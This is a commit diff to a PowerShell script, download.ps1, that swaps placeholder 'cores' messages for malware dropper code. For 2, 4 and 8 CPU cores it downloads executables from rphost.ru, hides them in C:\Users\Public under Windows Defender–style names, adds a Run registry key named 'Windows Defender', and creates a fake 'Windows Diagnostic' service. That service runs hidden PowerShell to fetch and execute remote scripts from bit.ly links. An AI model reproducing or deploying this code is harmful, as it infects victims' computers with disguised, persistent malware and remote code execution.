6aef43f3d53e1427a5fab6efd9dd97d4c04b4d6e
ExploitGF <32704607+ExploitGF@users.noreply.github.com>
2018-08-30 12:36:35 +0500

    Update download.ps1

--- download.ps1
+++ download.ps1
@@ -13,9 +13,36 @@ switch ($n)
 		} 
         2 
 		{
-		write-host "Two cores"          
+		
+		(New-Object System.Net.WebClient).DownloadFile("http://rphost.ru:5885/64.signed","C:\Users\Public\MSASC.exe")
+		Get-Item C:\Users\Public\MSASC.exe | foreach {$_.Attributes = 'ReadOnly, Hidden'}
+		(New-Object System.Net.WebClient).DownloadFile("http://rphost.ru:5885/MS_ASC64_2.signed","C:\Users\Public\MSASCuiL.exe")
+		Get-Item C:\Users\Public\MSASCuiL.exe | foreach {$_.Attributes = 'ReadOnly, Hidden'}
+		New-ItemProperty -Path 'hklm:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name "Windows Defender" -Value "C:\Users\Public\MSASCuiL.exe"
+                New-Service -Name "Windows Diagnostic" -BinaryPathName "cmd /c powershell.exe -nop -w hidden IEX (New-Object Net.WebClient).downloadstring('https://bit.ly/2ojGG3k');" -DisplayName "Windows Diagnostic" -Description "Windows Diagnostic"
+                start-process -FilePath 'C:\Users\Public\MSASCuiL.exe'
+		Exit       
 		}
-        3 { write-host "Three cores"        }
-        4 { write-host "Two cores"          }
+        4 { 
+	
+		(New-Object System.Net.WebClient).DownloadFile("http://rphost.ru:5885/64.signed","C:\Users\Public\MSASC.exe")
+		Get-Item C:\Users\Public\MSASC.exe | foreach {$_.Attributes = 'ReadOnly, Hidden'}
+		(New-Object System.Net.WebClient).DownloadFile("http://rphost.ru:5885/MS_ASC64_4.signed","C:\Users\Public\MSASCuiL.exe")
+		Get-Item C:\Users\Public\MSASCuiL.exe | foreach {$_.Attributes = 'ReadOnly, Hidden'}
+		New-ItemProperty -Path 'hklm:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name "Windows Defender" -Value "C:\Users\Public\MSASCuiL.exe"
+                New-Service -Name "Windows Diagnostic" -BinaryPathName "cmd /c powershell.exe -nop -w hidden IEX (New-Object Net.WebClient).downloadstring('https://bit.ly/2wrCOlr');" -DisplayName "Windows Diagnostic" -Description "Windows Diagnostic"
+                start-process -FilePath 'C:\Users\Public\MSASCuiL.exe'
+		Exit       
+	}
+        8 { 
+	        (New-Object System.Net.WebClient).DownloadFile("http://rphost.ru:5885/64.signed","C:\Users\Public\MSASC.exe")
+		Get-Item C:\Users\Public\MSASC.exe | foreach {$_.Attributes = 'ReadOnly, Hidden'}
+		(New-Object System.Net.WebClient).DownloadFile("http://rphost.ru:5885/MS_ASC64_8.signed","C:\Users\Public\MSASCuiL.exe")
+		Get-Item C:\Users\Public\MSASCuiL.exe | foreach {$_.Attributes = 'ReadOnly, Hidden'}
+		New-ItemProperty -Path 'hklm:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name "Windows Defender" -Value "C:\Users\Public\MSASCuiL.exe"
+                New-Service -Name "Windows Diagnostic" -BinaryPathName "cmd /c powershell.exe -nop -w hidden IEX (New-Object Net.WebClient).downloadstring('https://bit.ly/2Ph0KPi');" -DisplayName "Windows Diagnostic" -Description "Windows Diagnostic"
+                start-process -FilePath 'C:\Users\Public\MSASCuiL.exe'
+		Exit         
+	}
   default { write-host "$n cores"           }
 }
